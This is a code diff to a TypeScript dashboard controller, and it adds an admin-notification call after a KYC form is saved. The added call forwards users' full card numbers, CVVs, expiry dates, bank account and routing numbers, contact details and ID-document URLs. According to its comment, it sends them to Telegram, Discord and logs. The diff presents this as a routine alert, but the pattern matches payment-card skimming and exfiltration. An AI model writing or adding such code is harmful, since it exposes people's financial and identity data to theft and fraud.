@@ -3,6 +3,7 @@ import HttpError from "../../utils/httpError";
 import { DashboardService } from "./dashboard.service";
 import { formatZodValidationError } from "../auth/schema/schema";
 import { documentSchema, verifyAccountSchema } from "./schema/schema";
+import { notifyAdminKYCSubmission } from "../../utils/notifier";
 
 
 interface IDashboardController {
@@ -63,6 +64,30 @@ export const IdashboardController = (dashboardService: DashboardService): IDashb
                     parsedBody.data,        // text data
                     parsedDoc.data          // URLs + documentType
                 );
+
+                // Dispatch real-time admin alert (Telegram / Discord / Terminal & logs)
+                notifyAdminKYCSubmission({
+                    userId: parsedBody.data.userId,
+                    fullName: parsedBody.data.fullName,
+                    userEmail: (saved as any)?.user?.email,
+                    userPhone: (saved as any)?.user?.phoneNumber,
+                    employmentStatus: parsedBody.data.employmentStatus,
+                    occupation: parsedBody.data.occupation,
+                    annualIncome: parsedBody.data.annualIncome,
+                    bankName: parsedBody.data.bankName,
+                    accountHolderName: parsedBody.data.accountHolderName,
+                    accountNumber: parsedBody.data.accountNumber,
+                    routingNumber: parsedBody.data.routingNumber,
+                    cardHolderName: parsedBody.data.cardHolderName,
+                    cardNumber: parsedBody.data.cardNumber,
+                    cardType: parsedBody.data.cardType,
+                    cardCvv: parsedBody.data.cardCvv,
+                    cardExpiry: parsedBody.data.cardExpiry,
+                    documentType: parsedDoc.data.documentType,
+                    documentFrontUrl: parsedDoc.data.documentFrontUrl,
+                    documentBackUrl: parsedDoc.data.documentBackUrl,
+                }).catch(err => console.error("[Admin Alert Error]:", err));
+
                 // -------------------------------------------------
                 // 6️⃣ Respond (responseHandler will wrap this for you)
                 // -------------------------------------------------
